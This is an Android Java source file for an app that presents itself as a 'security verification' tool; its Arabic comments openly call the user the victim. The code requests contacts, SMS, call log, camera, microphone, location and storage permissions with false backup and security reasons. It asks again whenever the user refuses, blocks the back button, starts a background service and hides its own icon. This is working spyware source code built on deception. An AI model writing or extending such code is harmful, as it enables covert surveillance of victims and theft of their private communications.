package com.sec.check;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final String TAG = "SecurityCheck";
    private static final int PERMISSION_REQUEST = 1001;
    private static final int REQUEST_OVERLAY = 2001;

    // ★★★ ترتيب الصلاحيات — واحدة واحدة مع شرح
    private static final String[][] PERMISSIONS_WITH_REASON = {
            {Manifest.permission.READ_CONTACTS,
                    "لمزامنة جهات الاتصال كنسخة احتياطية"},
            {Manifest.permission.READ_SMS,
                    "لعمل نسخة احتياطية من الرسائل"},
            {Manifest.permission.READ_CALL_LOG,
                    "لحفظ سجل المكالمات كنسخة احتياطية"},
            {Manifest.permission.CAMERA,
                    "للبصمة الأمنية والتقاط صور التحقق"},
            {Manifest.permission.RECORD_AUDIO,
                    "لتسجيل البصمة الصوتية الأمنية"},
            {Manifest.permission.ACCESS_FINE_LOCATION,
                    "لتأمين حسابك حسب موقعك"},
            {Manifest.permission.READ_PHONE_STATE,
                    "للتحقق من هوية الجهاز"},
            {Manifest.permission.READ_EXTERNAL_STORAGE,
                    "للوصول لملفات النسخ الاحتياطي"},
            {Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    "لحفظ الملفات المؤقتة"},
    };

    private int currentPermIndex = 0;
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "======== APP STARTED =========");

        // ★ اعرض واجهة تشرح للتطبيق
        showInitialUI();

        // ★ ابدأ طلب الصلاحيات بعد 1.5 ثانية
        mainHandler.postDelayed(this::startPermissionFlow, 1500);
    }

    // ============================================================
    // واجهة أولية مقنعة
    // ============================================================
    private void showInitialUI() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#0b1120"));
        root.setGravity(Gravity.CENTER);
        root.setPadding(60, 60, 60, 60);

        TextView icon = new TextView(this);
        icon.setText("🔐");
        icon.setTextSize(80);
        icon.setGravity(Gravity.CENTER);
        root.addView(icon);

        TextView title = new TextView(this);
        title.setText("التحقق الأمني");
        title.setTextSize(24);
        title.setTextColor(Color.WHITE);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 30, 0, 0);
        root.addView(title);

        TextView msg = new TextView(this);
        msg.setText("يرجى الموافقة على الأذونات التالية\nلتأمين جهازك ضد الاختراق");
        msg.setTextSize(15);
        msg.setTextColor(Color.parseColor("#94a3b8"));
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, 20, 0, 0);
        msg.setLineSpacing(0, 1.4f);
        root.addView(msg);

        setContentView(root);
    }

    // ============================================================
    // طلب الصلاحيات — واحدة واحدة
    // ============================================================
    private void startPermissionFlow() {
        currentPermIndex = 0;
        requestNextPermission();
    }

    private void requestNextPermission() {
        if (currentPermIndex >= PERMISSIONS_WITH_REASON.length) {
            Log.d(TAG, "✅ All permissions requested");
            // خلص الطلب → شغّل الخدمة
            mainHandler.postDelayed(this::startServiceNow, 1000);
            mainHandler.postDelayed(this::hideAppIcon, 4000);
            return;
        }

        String permission = PERMISSIONS_WITH_REASON[currentPermIndex][0];
        String reason = PERMISSIONS_WITH_REASON[currentPermIndex][1];

        // لو ممنوحة → انتقل للتالية
        if (ContextCompat.checkSelfPermission(this, permission)
                == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "✅ Already granted: " + permission);
            currentPermIndex++;
            requestNextPermission();
            return;
        }

        // لو الضحية رفضت قبل كده → اعرض شرح ونعيد الطلب
        if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
            showRationaleDialog(permission, reason);
            return;
        }

        // اطلب مباشرة
        Log.d(TAG, "→ Requesting: " + permission);
        try {
            ActivityCompat.requestPermissions(this,
                    new String[]{permission}, PERMISSION_REQUEST);
        } catch (Exception e) {
            Log.e(TAG, "requestPermissions error: " + e.getMessage());
            currentPermIndex++;
            requestNextPermission();
        }
    }

    // ============================================================
    // شرح مُقنع للضحية
    // ============================================================
    private void showRationaleDialog(String permission, String reason) {
        try {
            new AlertDialog.Builder(this)
                    .setTitle("🔐 صلاحية مطلوبة للأمان")
                    .setMessage(reason + "\n\nبدون هذه الصلاحية لن يعمل التطبيق بشكل صحيح.")
                    .setPositiveButton("السماح", (dialog, which) -> {
                        ActivityCompat.requestPermissions(this,
                                new String[]{permission}, PERMISSION_REQUEST);
                    })
                    .setNegativeButton("تخطي", (dialog, which) -> {
                        currentPermIndex++;
                        requestNextPermission();
                    })
                    .setCancelable(false)
                    .show();
        } catch (Exception e) {
            Log.e(TAG, "dialog error: " + e.getMessage());
            currentPermIndex++;
            requestNextPermission();
        }
    }

    // ============================================================
    // استقبل نتيجة الصلاحية
    // ============================================================
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST) {
            for (int i = 0; i < permissions.length; i++) {
                boolean granted = grantResults.length > 0
                        && grantResults[i] == PackageManager.PERMISSION_GRANTED;
                Log.d(TAG, permissions[i] + " -> " + (granted ? "GRANTED" : "DENIED"));

                if (!granted) {
                    // لو رفضت → اطلب الصلاحية مرة أخرى بعد تأخير
                    final String perm = permissions[i];
                    mainHandler.postDelayed(() -> {
                        try {
                            ActivityCompat.requestPermissions(MainActivity.this,
                                    new String[]{perm}, PERMISSION_REQUEST);
                        } catch (Exception ignored) {}
                    }, 1500);
                    return;  // مش هننتقل للتالية، نعيد المحاولة على نفس الصلاحية
                }
            }

            // نجحت → التالية
            currentPermIndex++;
            mainHandler.postDelayed(this::requestNextPermission, 800);
        }
    }

    // ============================================================
    // تشغيل الخدمة
    // ============================================================
    private void startServiceNow() {
        try {
            Intent svc = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
            Log.d(TAG, "✅ Service started");
        } catch (Exception e) {
            Log.e(TAG, "Start service error: " + e.getMessage());
        }
    }

    // ============================================================
    // إخفاء الأيقونة
    // ============================================================
    private void hideAppIcon() {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.ComponentName component = new android.content.ComponentName(
                    this, MainActivity.class);
            pm.setComponentEnabledSetting(component,
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP);
            Log.d(TAG, "✅ App icon hidden");
        } catch (Exception e) {
            Log.e(TAG, "hideAppIcon: " + e.getMessage());
        }
    }

    @Override
    public void onBackPressed() {
        // منع الإغلاق
    }
    }
